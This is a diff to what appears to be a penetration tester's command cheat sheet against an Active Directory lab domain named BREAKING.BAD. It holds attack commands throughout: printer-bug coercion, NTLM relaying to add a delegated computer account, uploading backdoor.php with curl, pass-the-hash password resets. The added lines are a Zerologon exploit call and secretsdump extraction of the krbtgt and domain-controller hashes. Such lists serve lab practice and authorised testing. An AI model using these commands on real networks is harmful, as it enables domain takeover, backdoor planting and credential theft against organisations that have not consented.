@@ -9,7 +9,7 @@ nslookup -type=SRV _ldap._tcp.dc._msdcs.BREAKING.BAD
 mount -t cifs //192.168.56.201/C\$ /tmp/mnttarget/ -o username=anonymous -o domain=BREAKING.BAD
 rpcdump.py DC01.BREAKING.BAD | grep -A 6 MS-RPRN
 rpcdump.py DC02.BREAKING.BAD | grep -A 6 MS-RPRN
-dementor -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BAD
+dementor.py -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BAD
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN 123soleil --delegate-access
@@ -165,3 +165,6 @@ curl http://192.168.10.10/ --upload-file backdoor.php -v
 net rpc password someuser -U BREAKING/anotheruser%'P@ssword' -S DC01.BREAKING.BAD
 net rpc password someuser -U BREAKING/anotheruser -S DC01.BREAKING.BAD
 pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffffffffff:c1c635aa12ae60b7fe39e28456a7bac6 -S DC01.BREAKING.BAD
+secretsdump -just-dc-user krbtgt -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'BREAKING.BAD/DC01$@dc01.breaking.bad'
+secretsdump -history -just-dc-user 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'BREAKING.BAD/DC01$@dc01.breaking.bad'
+zerologon DC01 192.168.56.101
